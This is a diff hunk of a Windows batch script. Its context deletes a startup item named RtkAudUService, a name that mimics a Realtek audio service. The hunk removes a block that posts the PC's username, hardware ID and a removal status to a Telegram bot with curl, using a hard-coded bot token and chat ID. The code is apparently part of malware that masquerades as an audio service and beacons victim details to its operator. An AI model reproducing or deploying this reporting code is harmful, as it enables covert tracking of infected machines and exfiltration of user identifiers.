@@ -166,24 +166,6 @@ del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUServic
 echo Operation completed.
 
 
-:: Set bot token, chat ID, and message
-set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID=-1002163721260"
-set "MESSAGE=PC|%USERNAME%|%HWID%|RTK+RNTMISREMOVEEED|"
-
-
-:: URL encode the message by replacing spaces with %20
-set "ENCODED_MESSAGE=%MESSAGE: =%%2"
-
-:: Send the message using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
-     -d "chat_id=%CHAT_ID%" ^
-     -d "text=%ENCODED_MESSAGE%"
-
-echo Message sent to chat ID %CHAT_ID%
-
-
-
 
 
 
